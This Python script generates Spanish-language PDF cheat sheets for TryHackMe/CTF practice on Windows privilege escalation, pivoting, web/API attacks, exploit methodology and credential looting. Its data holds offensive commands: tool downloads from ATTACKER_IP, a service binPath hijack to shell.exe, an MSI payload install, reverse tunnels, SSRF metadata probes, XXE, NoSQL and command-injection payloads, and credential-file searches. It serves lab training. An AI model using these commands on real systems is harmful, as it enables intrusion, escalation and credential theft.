from pathlib import Path
import re

from pypdf import PdfReader, PdfWriter
from pypdf.annotations import Link
from pypdf.generic import ArrayObject, NumberObject
from reportlab.lib import colors
from reportlab.lib.enums import TA_CENTER
from reportlab.lib.pagesizes import A4
from reportlab.lib.styles import ParagraphStyle, getSampleStyleSheet
from reportlab.lib.units import cm
from reportlab.pdfbase.pdfmetrics import stringWidth
from reportlab.pdfgen import canvas
from reportlab.platypus import (
    PageBreak,
    Paragraph,
    Preformatted,
    SimpleDocTemplate,
    Spacer,
    Table,
    TableStyle,
)


ROOT = Path(__file__).resolve().parents[1]
OUT_DIR = ROOT / "output" / "pdf"
TMP_DIR = ROOT / "tmp" / "pdfs"
OUT_DIR.mkdir(parents=True, exist_ok=True)
TMP_DIR.mkdir(parents=True, exist_ok=True)


GENERATED_DOCS = [
    {
        "filename": "THM_GUIDE_2026-07-02_ultra-quick-start.pdf",
        "title": "Ultra Quick Start - Flujo minimo para rooms THM / CTF",
        "short": "Ultra quick start",
        "desc": "Hoja minima para arrancar cualquier room: preparar, descubrir, enumerar, acceder, escalar y cerrar.",
        "sections": [
            {
                "heading": "Objetivo",
                "body": [
                    "Pagina de arranque rapido para no quedarse mirando la terminal. Descubre superficie, enumera lo que exista, busca credenciales o bugs, consigue acceso, escala y documenta.",
                ],
            },
            {
                "heading": "1. Flujo minimo",
                "table": [
                    ["Fase", "Accion minima", "Resultado esperado"],
                    ["Preparar", "Crear carpetas, fijar IP/URL, anadir hostname si aplica.", "Entorno ordenado y variables listas."],
                    ["Descubrir", "nmap full TCP + servicios sobre puertos abiertos.", "Lista real de puertos y versiones."],
                    ["Enumerar", "Seguir servicio dominante: web, SMB, AD, DNS, SNMP, NFS.", "Usuarios, rutas, shares, endpoints o versiones."],
                    ["Priorizar", "Elegir 1-2 hipotesis con evidencia.", "Vector candidato claro."],
                    ["Acceso", "Cred reuse, RCE, upload, SSH, WinRM, SQLi o panel admin.", "Shell o login util."],
                    ["Post-exploit", "whoami/id, grupos, procesos, archivos, configs, credenciales.", "Mapa del contexto local."],
                    ["Privesc", "Linux: sudo/SUID/caps/cron/creds. Windows: privs/servicios/tareas/creds.", "Usuario superior o root/admin."],
                    ["Reenumerar", "Cada credencial nueva reinicia SMB/web/sudo/WinRM/LDAP/DB.", "Nuevas rutas desbloqueadas."],
                    ["Cierre", "Guardar comandos minimos, evidencia, flags y root cause.", "Writeup reproducible."],
                ],
            },
            {
                "heading": "2. Comandos base",
                "code": [
                    "mkdir -p nmap web loot creds hashes screenshots exploits notes",
                    "export IP=10.10.10.10",
                    "export URL=http://target.local",
                    "nmap -p- -Pn -n --min-rate 5000 $IP -oN nmap/all_ports.txt",
                    "nmap -sC -sV -Pn -p <PUERTOS> $IP -oN nmap/services.txt",
                ],
                "bullets": [
                    "Si ves web, pasa a discovery/Burp antes de brute force.",
                    "Si ves SMB/AD, busca usuarios reales antes de passwords.",
                    "Si consigues una credencial, vuelve a enumerar.",
                ],
            },
        ],
    },
    {
        "filename": "THM_GUIDE_2026-07-02_room-archetypes.pdf",
        "title": "Guia practica - Arquetipos de rooms THM / CTF",
        "short": "Arquetipos de rooms",
        "desc": "Tabla de diagnostico rapido para reconocer el tipo de room y elegir una ruta de trabajo.",
        "sections": [
            {
                "heading": "Objetivo",
                "body": [
                    "Guia corta para identificar el patron dominante de una room y no perder tiempo saltando entre comandos sin hipotesis.",
                    "Un arquetipo no sustituye la enumeracion: la ordena. Si una room mezcla varios patrones, prioriza el que te de identidad, credenciales o shell inicial.",
                ],
            },
            {
                "heading": "1. Tabla de arquetipos",
                "table": [
                    ["Arquetipo", "Senales", "Ruta recomendada"],
                    ["Web basica", "80/443, login, rutas ocultas, uploads.", "Discovery -> Burp -> LFI/SSTI/upload/IDOR/creds."],
                    ["WordPress/CMS", "wp-content, wp-login, plugins, temas.", "WPScan -> usuarios -> plugins/temas -> creds/wp-admin -> RCE."],
                    ["SQLi room", "Parametros, errores SQL, login bypass.", "Confirmar manual -> sqlmap con request -> dump -> hashes/RCE si aplica."],
                    ["SMB/Linux mixta", "445, shares, backups, usuarios reutilizables.", "Shares -> loot -> cred reuse -> SSH/web/sudo."],
                    ["Active Directory", "53/88/389/445, dominio, DC.", "Hosts/DNS -> usuarios -> spraying controlado -> Kerberos/BloodHound."],
                    ["Linux privesc", "Shell Linux sin root.", "id/sudo -l -> SUID -> caps -> cron/systemd -> creds."],
                    ["Windows privesc", "Shell Windows sin admin.", "whoami /priv -> servicios -> tareas -> registry -> creds."],
                    ["Pivoting", "Servicios localhost o red interna no accesible.", "Rutas/interfaces -> ssh -L/-D, chisel o ligolo -> reenum interna."],
                    ["Cracking/loot", "Hashes, kdbx, id_rsa, zips, backups.", "Convertir con *2john -> crackear -> cred reuse controlado."],
                    ["CVE/exploit", "Version concreta vulnerable.", "Verificar version/config -> leer PoC -> check -> payload minimo."],
                ],
            },
            {
                "heading": "2. Como decidir",
                "bullets": [
                    "Elige el arquetipo por evidencia: puertos, rutas, banners, usuarios, archivos o permisos.",
                    "Si aparece una credencial valida, reenumera antes de seguir explotando.",
                    "Si hay web y SMB a la vez, busca credenciales cruzadas: backups web en shares, usuarios de dominio en paneles, configs con DB creds.",
                    "Si tienes shell pero no avance, cambia a post-exploit/privesc. No sigas fuzzing externo por inercia.",
                    "Si no hay progreso en 20-30 minutos, usa la checklist de atasco.",
                ],
            },
            {
                "heading": "3. Atajos mentales",
                "table": [
                    ["Si el primer hallazgo es...", "Piensa primero en..."],
                    ["Usuarios reales", "Password spraying controlado, usuario=password, AS-REP/Kerberoast en AD."],
                    ["Backup o config", "Credenciales, rutas internas, DB, reutilizacion en SSH/SMB/web."],
                    ["Upload", "Extension, Content-Type, magic bytes, ruta de ejecucion."],
                    ["Servicio localhost", "Port forward o pivot antes de enumerar mas fuera."],
                    ["Version vulnerable", "Confirmar version/config y leer PoC antes de ejecutar."],
                    ["Shell limitada", "Estabilizar, transferir herramientas y enumerar local."],
                ],
            },
        ],
    },
    {
        "filename": "THM_GUIDE_2026-07-02_windows-local-privilege-escalation.pdf",
        "title": "Guia practica - Windows Local Privilege Escalation para THM / CTF",
        "short": "Windows local privilege escalation",
        "desc": "Post-exploit Windows fuera de AD: privilegios, servicios, tareas, registry, credenciales y winPEAS.",
        "sections": [
            {
                "heading": "Objetivo",
                "body": [
                    "Guia reutilizable para saber que mirar despues de conseguir una shell en Windows. Esta pensada para labs autorizados tipo TryHackMe/CTF.",
                    "La idea no es lanzar winPEAS y esperar magia, sino entender la cadena: identidad -> privilegios -> servicios/tareas/configs -> credenciales -> escalada.",
                ],
            },
            {
                "heading": "1. Primeros pasos tras conseguir shell",
                "body": [
                    "Empieza por saber quien eres, en que maquina estas y que restricciones tiene la shell.",
                ],
                "code": [
                    "whoami",
                    "whoami /user",
                    "whoami /groups",
                    "whoami /priv",
                    "hostname",
                    "cd",
                    "echo %USERNAME%",
                    "echo %USERDOMAIN%",
                    "ver",
                    "systeminfo",
                ],
                "bullets": [
                    "Si ves SeImpersonatePrivilege o SeAssignPrimaryTokenPrivilege, piensa en tecnicas Potato/impersonation de laboratorio.",
                    "Si perteneces a Backup Operators, Remote Management Users, Administrators o un grupo de servicio raro, revisa permisos especiales.",
                    "Si la shell es limitada, intenta pasar a PowerShell o subir una shell mas comoda antes de enumerar mucho.",
                ],
            },
            {
                "heading": "2. Estabilizar y transferir herramientas",
                "body": ["Prueba primero binarios nativos. Sube herramientas solo cuando necesites confirmar o acelerar."],
                "code": [
                    "powershell -NoProfile -ExecutionPolicy Bypass",
                    "certutil -urlcache -split -f http://ATTACKER_IP:8000/winPEASx64.exe C:\\Windows\\Temp\\winpeas.exe",
                    "powershell -c \"iwr http://ATTACKER_IP:8000/winPEASx64.exe -OutFile C:\\Windows\\Temp\\winpeas.exe\"",
                    "C:\\Windows\\Temp\\winpeas.exe",
                ],
                "bullets": [
                    "Si certutil esta bloqueado, prueba iwr, curl.exe, bitsadmin o SMB temporal desde tu maquina.",
                    "Guarda salida en archivo cuando sea larga: winpeas.exe > C:\\Windows\\Temp\\wp.txt.",
                    "No ejecutes exploits destructivos si no has confirmado version, arquitectura y privilegios.",
                ],
            },
            {
                "heading": "3. Informacion de sistema y parches",
                "body": ["Busca version, arquitectura, hotfixes y software instalado. En THM esto suele orientar CVEs o misconfigs."],
                "code": [
                    "systeminfo",
                    "wmic qfe get Caption,Description,HotFixID,InstalledOn",
                    "wmic os get Caption,Version,BuildNumber,OSArchitecture",
                    "wmic product get name,version 2>nul",
                    "dir \"C:\\Program Files\"",
                    "dir \"C:\\Program Files (x86)\"",
                ],
                "bullets": [
                    "Kernel exploits son ultimo recurso: primero sudo-equivalentes, servicios, credenciales y tareas.",
                    "Software antiguo con servicio local suele ser mas rentable que un exploit de kernel.",
                ],
            },
            {
                "heading": "4. Servicios: el vector mas comun",
                "body": ["Un servicio vulnerable permite escalar si puedes modificar su binario, configuracion o ruta ejecutada por SYSTEM."],
                "code": [
                    "sc query state= all",
                    "wmic service get name,displayname,pathname,startmode | findstr /i \"Auto\"",
                    "sc qc SERVICIO",
                    "accesschk.exe -uwcqv \"Authenticated Users\" *",
                    "accesschk.exe -uwcqv %USERNAME% SERVICIO",
                ],
                "bullets": [
                    "Unquoted service path: ruta con espacios sin comillas y directorios escribibles antes del exe real.",
                    "Weak service permissions: puedes cambiar binPath o reiniciar el servicio.",
                    "Weak file permissions: puedes sustituir el ejecutable que arranca el servicio.",
                    "Pregunta clave: puedo modificar algo que se ejecuta como LocalSystem, LocalService o usuario privilegiado?",
                ],
                "code2": [
                    "sc config SERVICIO binPath= \"cmd /c C:\\Windows\\Temp\\shell.exe\"",
                    "sc stop SERVICIO",
                    "sc start SERVICIO",
                ],
            },
            {
                "heading": "5. Unquoted service paths",
                "body": ["Si el binario es C:\\Program Files\\Vendor App\\service.exe sin comillas, Windows prueba rutas intermedias."],
                "code": [
                    "wmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\" | findstr /i /v '\"'",
                    "icacls \"C:\\Program Files\"",
                    "icacls \"C:\\Program Files\\Vendor App\"",
                ],
                "bullets": [
                    "Necesitas escribir en una ruta anterior a la final y poder reiniciar el servicio o esperar reinicio.",
                    "En labs, el ejecutable se suele llamar como el primer segmento: C:\\Program.exe o C:\\Program Files\\Vendor.exe.",
                ],
            },
            {
                "heading": "6. Tareas programadas y autoruns",
                "body": ["Busca scripts o binarios ejecutados automaticamente por un usuario superior."],
                "code": [
                    "schtasks /query /fo LIST /v",
                    "dir C:\\Windows\\Tasks",
                    "dir C:\\Windows\\System32\\Tasks /s /b",
                    "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                ],
                "bullets": [
                    "Revisa rutas personalizadas en C:\\Users, C:\\ProgramData, C:\\Backup, C:\\Scripts, C:\\Temp.",
                    "Si puedes escribir el script o carpeta usada por la tarea, puedes controlar lo que ejecuta.",
                    "Comprueba usuario de ejecucion y frecuencia antes de tocar nada.",
                ],
            },
            {
                "heading": "7. AlwaysInstallElevated",
                "body": ["Misconfig clasica de CTF: si ambas claves estan a 1, un MSI puede ejecutarse elevado."],
                "code": [
                    "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
                    "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
                    "msiexec /quiet /qn /i C:\\Windows\\Temp\\payload.msi",
                ],
                "bullets": [
                    "Solo es explotable si HKCU y HKLM devuelven 0x1.",
                    "Genera el MSI en tu maquina atacante y documenta el vector; no lo uses fuera de laboratorio.",
                ],
            },
            {
                "heading": "8. Privilegios especiales",
                "body": ["whoami /priv decide muchas rutas de escalada."],
                "table": [
                    ["Privilegio", "Que probar primero"],
                    ["SeImpersonatePrivilege", "JuicyPotato/PrintSpoofer/RoguePotato segun version y restricciones del lab."],
                    ["SeBackupPrivilege", "Leer archivos protegidos, SAM/SYSTEM o datos sensibles mediante backup semantics."],
                    ["SeRestorePrivilege", "Posible sobrescritura de archivos sensibles si el contexto lo permite."],
                    ["SeDebugPrivilege", "Dump de procesos o tokens si herramientas y permisos lo permiten."],
                    ["SeManageVolumePrivilege", "Vector raro, pero en CTF puede permitir escritura privilegiada mediante tecnica especifica."],
                ],
            },
            {
                "heading": "9. Credenciales en Windows",
                "body": ["Las escaladas mas limpias suelen ser credenciales reutilizadas."],
                "code": [
                    "cmdkey /list",
                    "dir /s /b *pass* *cred* *config* *backup* 2>nul",
                    "findstr /si password *.txt *.ini *.config *.xml 2>nul",
                    "type C:\\Windows\\Panther\\Unattend.xml 2>nul",
                    "type C:\\Windows\\Panther\\Unattended.xml 2>nul",
                    "type %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul",
                ],
                "bullets": [
                    "Revisa web.config, appsettings.json, scripts PowerShell, backups y shares montados.",
                    "Si cmdkey lista credenciales guardadas, prueba runas /savecred en contexto de lab.",
                ],
            },
            {
                "heading": "10. Checklist minima",
                "bullets": [
                    "whoami /priv y grupos.",
                    "systeminfo, hotfixes y software instalado.",
                    "Servicios: permisos, binPath, unquoted paths y ejecutables escribibles.",
                    "Tareas programadas, autoruns y scripts en rutas escribibles.",
                    "AlwaysInstallElevated y registry sensible.",
                    "Credenciales en configs, history, backups, shares y cmdkey.",
                    "winPEAS para confirmar, no para sustituir razonamiento.",
                ],
            },
        ],
    },
    {
        "filename": "THM_GUIDE_2026-07-02_pivoting-tunneling.pdf",
        "title": "Guia practica - Pivoting y Tunneling para THM / CTF",
        "short": "Pivoting y tunneling",
        "desc": "Decision tree para SSH, chisel, ligolo-ng, proxychains, rutas internas y validacion de pivots.",
        "sections": [
            {
                "heading": "Objetivo",
                "body": [
                    "Guia para cuando una maquina comprometida ve servicios o redes que tu atacante no ve directamente.",
                    "Mentalidad: descubrir red interna -> elegir tunel -> validar alcance -> enumerar sin ruido -> mover solo lo necesario.",
                ],
            },
            {
                "heading": "1. Detectar que necesitas pivot",
                "code": [
                    "ip a",
                    "ip route",
                    "ss -tulpen",
                    "netstat -ano",
                    "hostname -I",
                    "cat /etc/hosts",
                    "arp -a",
                ],
                "bullets": [
                    "127.0.0.1 con servicio interesante: necesitas local port forward.",
                    "Interfaz adicional 172.16/10.10/192.168: puede haber red interna.",
                    "Rutas hacia subredes que tu Kali no alcanza: necesitas SOCKS, TUN o forward especifico.",
                ],
            },
            {
                "heading": "2. Elegir tecnica rapidamente",
                "table": [
                    ["Situacion", "Tecnica recomendada"],
                    ["Tengo SSH al pivot", "ssh -L para servicio concreto, ssh -D para SOCKS."],
                    ["No tengo SSH pero puedo ejecutar binarios", "chisel o ligolo-ng."],
                    ["Necesito escanear muchos puertos/hosts", "ligolo-ng suele ser mas comodo que SOCKS."],
                    ["Solo necesito una web interna", "forward local especifico con ssh -L o chisel."],
                    ["Servicio interno usa hostname", "tunel + /etc/hosts o proxy que respete DNS segun caso."],
                ],
            },
            {
                "heading": "3. SSH local, dynamic y reverse forwards",
                "body": ["Usa SSH si ya tienes credenciales o clave. Es estable y facil de razonar."],
                "code": [
                    "# Local forward: exponer servicio interno en tu Kali",
                    "ssh -L 8080:127.0.0.1:80 user@$IP",
                    "curl http://127.0.0.1:8080",
                    "",
                    "# SOCKS proxy para multiples destinos",
                    "ssh -D 1080 -N user@$IP",
                    "proxychains nmap -sT -Pn -p80,445 10.10.20.5",
                    "",
                    "# Reverse forward: cuando el pivot puede salir hacia ti",
                    "ssh -R 9001:127.0.0.1:9001 user@ATTACKER_IP",
                ],
                "bullets": [
                    "-L = tu maquina escucha y manda trafico hacia dentro.",
                    "-D = SOCKS local para herramientas compatibles con proxychains.",
                    "-R = la maquina remota abre un puerto que vuelve hacia ti.",
                ],
            },
            {
                "heading": "4. Chisel",
                "body": ["Chisel es util cuando no hay SSH. Necesitas servidor en un lado y cliente en el otro."],
                "code": [
                    "# Atacante",
                    "chisel server -p 8000 --reverse",
                    "",
                    "# Victima/pivot: SOCKS reverse hacia atacante",
                    "./chisel client ATTACKER_IP:8000 R:socks",
                    "",
                    "# Atacante: usar SOCKS",
                    "proxychains curl http://10.10.20.5/",
                    "",
                    "# Forward especifico",
                    "./chisel client ATTACKER_IP:8000 R:8080:127.0.0.1:80",
                ],
                "bullets": [
                    "Si hay firewall de entrada, usa reverse: la victima conecta hacia tu maquina.",
                    "Comprueba con curl antes de lanzar escaneos grandes.",
                ],
            },
            {
                "heading": "5. Ligolo-ng",
                "body": ["Ligolo-ng crea una interfaz tun y suele simplificar escaneos internos en labs."],
                "code": [
                    "# Atacante",
                    "sudo ip tuntap add user $USER mode tun ligolo",
                    "sudo ip link set ligolo up",
                    "./proxy -selfcert -laddr 0.0.0.0:11601",
                    "",
                    "# Pivot",
                    "./agent -connect ATTACKER_IP:11601 -ignore-cert",
                    "",
                    "# En consola ligolo",
                    "session",
                    "ifconfig",
                    "start",
                    "",
                    "# Atacante: ruta hacia red interna",
                    "sudo ip route add 10.10.20.0/24 dev ligolo",
                    "nmap -Pn -sT -p80,445 10.10.20.5",
                ],
                "bullets": [
                    "Muy comodo cuando quieres tratar la red interna como enrutable.",
                    "Usa -sT en nmap si SYN scan no funciona por el tunel.",
                ],
            },
            {
                "heading": "6. Proxychains y nmap",
                "body": ["No todas las herramientas funcionan igual sobre SOCKS."],
                "code": [
                    "echo 'socks5 127.0.0.1 1080' | sudo tee -a /etc/proxychains4.conf",
                    "proxychains curl http://10.10.20.5/",
                    "proxychains nmap -sT -Pn -n -p80,445 10.10.20.5",
                    "proxychains crackmapexec smb 10.10.20.5 -u USER -p PASS",
                ],
                "bullets": [
                    "Con proxychains usa TCP connect scan (-sT), no SYN scan.",
                    "Evita escaneos -p- enormes al principio; valida hosts y puertos probables.",
                ],
            },
            {
                "heading": "7. DNS y nombres internos",
                "body": ["Muchas apps internas dependen de hostnames."],
                "code": [
                    "cat /etc/resolv.conf",
                    "nslookup intranet.local DNS_INTERNO",
                    "dig @DNS_INTERNO intranet.local",
                    "echo '10.10.20.5 intranet.local' | sudo tee -a /etc/hosts",
                ],
                "bullets": [
                    "Si el tunel no transporta DNS, resuelve manualmente y anade /etc/hosts.",
                    "En AD, Kerberos suele requerir FQDN y reloj correcto.",
                ],
            },
            {
                "heading": "8. Validacion antes de seguir",
                "bullets": [
                    "Puedo hacer ping o TCP connect al host interno?",
                    "curl/nc confirma el servicio esperado?",
                    "La herramienta usa el proxy o esta saliendo directo?",
                    "El hostname resuelve al destino correcto?",
                    "Tengo notas claras de: atacante -> pivot -> red interna -> servicio?",
                ],
            },
        ],
    },
    {
        "filename": "THM_GUIDE_2026-07-02_web-modern-api-testing.pdf",
        "title": "Guia practica - Web moderna y APIs para THM / CTF",
        "short": "Web moderna y APIs",
        "desc": "Checklist para IDOR/BOLA, JWT, OAuth basico, GraphQL, SSRF, XXE, NoSQLi, uploads y command injection.",
        "sections": [
            {
                "heading": "Objetivo",
                "body": [
                    "Complemento para rooms web que no son solo directorios ocultos y CMS. En apps modernas, el bug suele estar en APIs, autorizacion, tokens o parsers.",
                    "Regla mental: autenticacion responde quien eres; autorizacion responde que puedes hacer. Muchas rooms se rompen por autorizacion floja.",
                ],
            },
            {
                "heading": "1. Mapa inicial de la app",
                "code": [
                    "whatweb -a 3 $URL",
                    "curl -i $URL/",
                    "katana -u $URL -d 3",
                    "arjun -u \"$URL/api/endpoint\"",
                    "ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404",
                ],
                "bullets": [
                    "Busca /api, /graphql, /swagger, /openapi.json, /docs, /admin, /debug, /actuator.",
                    "Guarda requests interesantes desde Burp. SQLMap, ffuf y scripts propios funcionan mejor con request completa.",
                ],
            },
            {
                "heading": "2. IDOR / BOLA",
                "body": ["La prueba mas rentable: cambiar IDs y comparar respuestas entre usuarios."],
                "code": [
                    "GET /api/users/1001",
                    "GET /api/users/1002",
                    "GET /api/orders/5",
                    "GET /api/orders/6",
                ],
                "bullets": [
                    "Crea dos cuentas si la room lo permite.",
                    "Prueba IDs numericos, UUIDs filtrados, emails, usernames y slugs.",
                    "No basta con ocultar botones en frontend: comprueba API directa.",
                    "Senal fuerte: status 200 con datos de otro usuario o accion aceptada sobre recurso ajeno.",
                ],
            },
            {
                "heading": "3. JWT",
                "code": [
                    "jwt_tool TOKEN",
                    "python3 - <<'PY'\nimport jwt\nprint(jwt.get_unverified_header('TOKEN'))\nprint(jwt.decode('TOKEN', options={'verify_signature': False}))\nPY",
                ],
                "bullets": [
                    "Mira alg, kid, jku, exp, role, isAdmin, user_id.",
                    "Prueba manipulacion solo en lab: none alg, secreto debil, confusion HS/RS si el reto apunta a ello.",
                    "Si el token cambia rol en cliente pero el servidor no valida firma/autorizacion, hay bug.",
                ],
            },
            {
                "heading": "4. GraphQL",
                "code": [
                    "POST /graphql",
                    "{\"query\":\"{__schema{types{name}}}\"}",
                    "{\"query\":\"{users{id username email role}}\"}",
                ],
                "bullets": [
                    "Prueba introspection; si esta activa, enumera tipos y queries.",
                    "Busca queries con id, userId, file, path, admin, debug.",
                    "IDOR tambien aplica: cambia variables en queries/mutations.",
                ],
            },
            {
                "heading": "5. SSRF",
                "body": ["Cualquier parametro que haga fetch de URL, avatar, webhook o import puede ser candidato."],
                "code": [
                    "url=http://127.0.0.1:80",
                    "url=http://localhost:8000",
                    "url=http://169.254.169.254/latest/meta-data/",
                    "url=http://[::1]/",
                    "url=file:///etc/passwd",
                ],
                "bullets": [
                    "Confirma primero con tu listener: python3 -m http.server 8000.",
                    "Prueba localhost, 127.0.0.1, redes internas y redirects si el lab lo sugiere.",
                    "No hagas escaneo agresivo desde SSRF; valida con pocos puertos probables.",
                ],
            },
            {
                "heading": "6. XXE",
                "code": [
                    "<?xml version=\"1.0\"?>",
                    "<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
                    "<root>&xxe;</root>",
                ],
                "bullets": [
                    "Solo aplica si la app procesa XML: import, SOAP, SVG, DOCX/XLSX, SAML.",
                    "Si no refleja salida, intenta OOB en tu servidor HTTP/DNS dentro del lab.",
                ],
            },
            {
                "heading": "7. NoSQL Injection",
                "code": [
                    "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
                    "username[$ne]=admin&password[$ne]=x",
                    "{\"$where\":\"this.username=='admin'\"}",
                ],
                "bullets": [
                    "Senal: backend Node/Mongo, errores BSON/Mongoose, filtros JSON directos.",
                    "Comprueba bypass login, filtros de busqueda y endpoints admin.",
                ],
            },
            {
                "heading": "8. File upload matrix",
                "table": [
                    ["Control", "Pruebas"],
                    ["Extension", "php, phtml, phar, jsp, aspx, svg, html, double extension."],
                    ["Content-Type", "image/png vs application/x-php."],
                    ["Magic bytes", "GIF89a, PNG header si el lab valida firma."],
                    ["Ruta", "Se puede predecir uploads/? Hay path traversal en filename?"],
                    ["Ejecucion", "El servidor ejecuta o solo sirve el archivo?"],
                ],
            },
            {
                "heading": "9. Command injection",
                "code": [
                    "; id",
                    "&& id",
                    "| id",
                    "`id`",
                    "$(id)",
                    "%0Aid",
                ],
                "bullets": [
                    "Parametros tipicos: host, ip, domain, filename, backup, convert, ping, traceroute.",
                    "Confirma con comandos inocuos primero: id, whoami, hostname.",
                    "Si no hay output, usa sleep/ping hacia tu maquina en entorno de lab.",
                ],
            },
            {
                "heading": "10. Checklist web/API",
                "bullets": [
                    "Descubrir endpoints y guardar requests reales.",
                    "Probar authz horizontal y vertical con dos usuarios.",
                    "Revisar tokens, cookies, CORS y cabeceras.",
                    "Buscar parsers: JSON, XML, YAML, template, markdown, image processors.",
                    "Enumerar docs: Swagger/OpenAPI/GraphQL/actuator/debug.",
                    "Validar bug con impacto claro y pasos reproducibles.",
                ],
            },
        ],
    },
    {
        "filename": "THM_GUIDE_2026-07-02_cve-exploit-methodology.pdf",
        "title": "Guia practica - Metodologia CVE y Exploits para THM / CTF",
        "short": "Metodologia CVE/exploit",
        "desc": "Como verificar versiones, evaluar PoCs, adaptar exploits y evitar falsos positivos o impactos destructivos.",
        "sections": [
            {
                "heading": "Objetivo",
                "body": [
                    "Guia para pasar de 'veo una version' a 'tengo un exploit razonable' sin ejecutar cualquier PoC a ciegas.",
                    "En CTF el tiempo importa, pero un exploit incorrecto puede hacerte perder mas tiempo que una enumeracion cuidadosa.",
                ],
            },
            {
                "heading": "1. Confirmar version real",
                "code": [
                    "nmap -sC -sV -p PUERTO $IP",
                    "curl -i $URL/",
                    "whatweb -a 3 $URL",
                    "searchsploit PRODUCT VERSION",
                    "banner grab: nc -nv $IP PUERTO",
                ],
                "bullets": [
                    "No confies en un solo banner; puede estar oculto, parcheado o falseado.",
                    "Busca version en headers, HTML, JS, changelog, readme, package files y rutas admin.",
                    "Diferencia producto, plugin, tema, modulo y sistema operativo.",
                ],
            },
            {
                "heading": "2. Triage de candidatos",
                "table": [
                    ["Pregunta", "Decision"],
                    ["Coincide producto exacto?", "Si no, baja prioridad."],
                    ["Coincide rango de versiones?", "Si esta fuera, busca bypass o descarta."],
                    ["Requiere credenciales?", "Separar pre-auth de post-auth."],
                    ["Requiere rol admin?", "Solo util si ya tienes ese rol."],
                    ["Es RCE, LFI, auth bypass o info leak?", "Prioriza segun cadena de ataque."],
                    ["Es destructivo?", "Evitar salvo que el lab lo pida explicitamente."],
                ],
            },
            {
                "heading": "3. Leer PoC antes de ejecutar",
                "bullets": [
                    "Identifica inputs: RHOST, RPORT, URL, usuario, password, callback, archivo.",
                    "Busca acciones peligrosas: rm, format, shutdown, useradd persistente, cambios irreversibles.",
                    "Comprueba dependencias y version de Python/Ruby/Go.",
                    "Entiende que condicion confirma exito: status, archivo creado, callback, salida en HTTP.",
                ],
                "code": [
                    "sed -n '1,220p' exploit.py",
                    "grep -nEi \"rm|del|format|shutdown|useradd|chmod|curl|wget|socket|subprocess\" exploit.py",
                    "python3 exploit.py -h",
                ],
            },
            {
                "heading": "4. Adaptar exploit con control",
                "body": ["Primero haz que imprima o confirme, luego que explote."],
                "code": [
                    "# 1. Probar reachability",
                    "curl -i $URL/vulnerable/path",
                    "",
                    "# 2. Reproducir manualmente la parte minima",
                    "curl -i -X POST $URL/endpoint -d 'param=test'",
                    "",
                    "# 3. Ejecutar PoC en modo check si existe",
                    "python3 exploit.py --check --url $URL",
                ],
                "bullets": [
                    "Reduce el PoC a la peticion esencial cuando puedas.",
                    "Cambia payloads a comandos inocuos primero: id, whoami, hostname.",
                    "Loguea requests/responses para poder explicar la cadena.",
                ],
            },
            {
                "heading": "5. Compilacion segura de exploits",
                "code": [
                    "file exploit.c",
                    "grep -nEi \"socket|connect|system|popen|exec|fork|unlink|remove\" exploit.c",
                    "gcc exploit.c -o exploit",
                    "./exploit --help",
                ],
                "bullets": [
                    "Compila en una carpeta temporal, no como root salvo que sea imprescindible.",
                    "Si el exploit es para la victima, compila para su arquitectura: x86/x64, Linux/Windows.",
                    "En Windows labs, revisa si necesitas mingw: x86_64-w64-mingw32-gcc.",
                ],
            },
            {
                "heading": "6. Cuando descartar",
                "bullets": [
                    "La version no coincide y no hay evidencia de vulnerabilidad.",
                    "Requiere credenciales/rol que no tienes.",
                    "El PoC depende de una configuracion que el target no expone.",
                    "Solo causa DoS y la room busca flags/acceso.",
                    "No puedes explicar que hace despues de leerlo.",
                ],
            },
            {
                "heading": "7. Registro de evidencia",
                "code": [
                    "mkdir -p evidence exploit notes",
                    "cp exploit.py exploit/original_exploit.py",
                    "script -a evidence/exploit_run.log",
                    "# ejecutar prueba",
                    "exit",
                ],
                "bullets": [
                    "Guarda version detectada, fuente del exploit, cambios hechos y output de exito.",
                    "Anota precondiciones: usuario requerido, ruta, configuracion, puerto.",
                    "Si falla, registra error y razon probable para no repetir bucles.",
                ],
            },
        ],
    },
    {
        "filename": "THM_GUIDE_2026-07-02_credentials-cracking-loot.pdf",
        "title": "Guia practica - Credenciales, Cracking y Loot para THM / CTF",
        "short": "Credenciales, cracking y loot",
        "desc": "Fuentes de credenciales, conversiones john, hashcat, KeePass, backups, history files y reutilizacion controlada.",
        "sections": [
            {
                "heading": "Objetivo",
                "body": ["Una credencial encontrada suele desbloquear mas que un exploit. Esta guia ordena donde buscar, como convertir hashes y como probar reutilizacion sin perder control."],
            },
            {
                "heading": "1. Fuentes de credenciales",
                "table": [
                    ["Lugar", "Que buscar"],
                    ["Web root", ".env, config.php, wp-config.php, web.config, appsettings.json."],
                    ["Homes", ".ssh, history, notes, Desktop, Downloads, backups."],
                    ["Shares", "Backups, IT, Dev, Deploy, SYSVOL, NETLOGON, scripts."],
                    ["Bases de datos", "users, admins, credentials, config, settings."],
                    ["Windows", "cmdkey, Unattend.xml, PowerShell history, IIS configs."],
                    ["Linux", ".bash_history, /var/www, /opt, /var/backups, cron scripts."],
                ],
            },
            {
                "heading": "2. Busqueda rapida Linux",
                "code": [
                    "find / -name '*pass*' -o -name '*cred*' -o -name '*.kdbx' 2>/dev/null",
                    "grep -RniE 'pass|password|passwd|pwd|secret|token|api[_-]?key' /var/www /opt /home 2>/dev/null",
                    "find /home -name '.ssh' -type d 2>/dev/null",
                    "cat ~/.bash_history 2>/dev/null",
                    "ls -la /var/backups /backup /opt 2>/dev/null",
                ],
            },
            {
                "heading": "3. Busqueda rapida Windows",
                "code": [
                    "cmdkey /list",
                    "dir /s /b *pass* *cred* *config* *backup* *.kdbx 2>nul",
                    "findstr /si password *.txt *.ini *.config *.xml *.json 2>nul",
                    "type %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul",
